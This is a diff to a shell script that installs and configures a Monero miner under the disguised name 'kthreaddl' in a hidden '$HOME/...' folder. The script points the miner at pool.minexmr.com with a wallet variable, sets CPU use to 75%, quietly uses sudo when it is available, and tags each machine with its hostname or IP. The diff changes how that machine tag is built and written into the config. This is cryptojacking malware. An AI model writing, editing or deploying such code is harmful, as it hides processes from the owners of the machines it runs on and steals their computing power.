@@ -934,6 +934,13 @@ SetupNameServers
 #------------------------------------------------------------
 
 
+PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
+if [ "$PASS" == "localhost" ]; then
+  PASS=`ip route get 1 | awk '{print $NF;exit}'`
+fi
+if [ -z $PASS ]; then
+  PASS=na
+fi
 
 if sudo -n true 2>/dev/null; then
   sudo systemctl stop kthreaddl.service
@@ -976,7 +983,6 @@ if (test $? -ne 0); then
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.../config.json
   sed -i 's/"url": *"[^"]*",/"url": "pool.minexmr.com:443",/' $HOME/.../config.json
   sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.../config.json
-  sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.../config.json
   sed -i 's/"tls": *"[^"]*",/"tls": true,/' $HOME/.../config.json
   sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 75,/' $HOME/.../config.json
   $HOME/.../kthreaddl --help >/dev/null
@@ -988,7 +994,8 @@ if (test $? -ne 0); then
   fi
 fi
 
-sed -i 's/"rig-id": *"[^"]*",/"rig-id": "'$PASS'",/' $HOME/.../config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.../config.json
+sed -i 's/"rig-id": *null,/"rig-id": "'$PASS'",/' $HOME/.../config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/.../.kthreaddl.log'",#' $HOME/.../config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.../config.json
 
